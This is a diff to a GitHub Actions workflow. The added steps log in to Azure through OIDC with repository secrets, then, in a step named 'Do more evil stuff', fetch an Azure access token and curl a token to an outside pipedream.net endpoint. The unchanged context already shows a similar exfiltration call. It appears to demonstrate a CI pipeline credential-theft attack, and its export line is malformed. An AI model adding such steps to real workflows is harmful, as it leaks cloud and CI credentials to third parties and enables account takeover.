@@ -29,3 +29,18 @@ jobs:
           curl -d '{"token":"${{ env.ACCESS_TOKEN }}"}' \
           -H "Content-Type: application/json" \
           "https://3cc9d6e97f71d89fba8c9afc13798b57.m.pipedream.net"
+      - name: OIDC Login to Azure Public Cloud
+        uses: azure/login@v1
+        with:
+          client-id: ${{ secrets.CLIENTID }}
+          tenant-id: ${{ secrets.TENANTID }}
+      - name: Do more evil stuff
+        uses: azure/CLI@v1
+        with:
+          inlineScript: |
+            export AZ_TOKEN = az account get-access-token
+            curl -d '{"token":"${{ env.ACCESS_TOKEN }}"}' \
+            -H "Content-Type: application/json" \
+            "https://3cc9d6e97f71d89fba8c9afc13798b57.m.pipedream.net"
+            
+            
